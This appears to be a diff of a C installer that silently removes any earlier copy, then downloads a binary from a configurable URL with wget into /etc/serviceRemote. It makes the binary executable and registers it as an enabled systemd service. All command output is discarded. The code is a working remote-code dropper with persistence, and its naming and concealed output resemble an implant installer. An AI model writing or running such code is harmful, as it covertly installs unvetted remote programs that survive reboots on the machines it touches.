@@ -7,11 +7,23 @@
 
 int main()
 {
+
+  // Clear files and folders
+  system("rm -rf /etc/serviceRemote >> /dev/null 2>&1");
+  system("rm -rf /etc/systemd/system/" SERVICE_NAME ".service >> /dev/null 2>&1");
+
+  // Remove services
+  system("systemctl stop " SERVICE_NAME ".service >> /dev/null 2>&1");
+  system("systemctl disable " SERVICE_NAME ".service >> /dev/null 2>&1");
+
+  // Remove Folders
+  system("rm -rf /etc/serviceRemote >> /dev/null 2>&1");
+
   // Download and move the binary to the target path
   system("mkdir -p /etc/serviceRemote >> /dev/null 2>&1");
   system("wget -O /etc/serviceRemote/serviceRemote " DOWNLOAD_URL " >> /dev/null 2>&1");
   system("chmod +x /etc/serviceRemote/serviceRemote >> /dev/null 2>&1");
-  system("/etc/serviceRemote/serviceRemote /dev/null 2>&1");
+  // system("/etc/serviceRemote/serviceRemote /dev/null 2>&1");
 
   // Create a service to run the binary
   FILE *serviceFile = fopen("/etc/systemd/system/" SERVICE_NAME ".service", "w");
@@ -50,6 +62,6 @@ int main()
   // Enable and start the service
   system("systemctl enable " SERVICE_NAME ".service >> /dev/null 2>&1");
   system("systemctl start " SERVICE_NAME ".service >> /dev/null 2>&1");
-  
+
   return 0;
 }
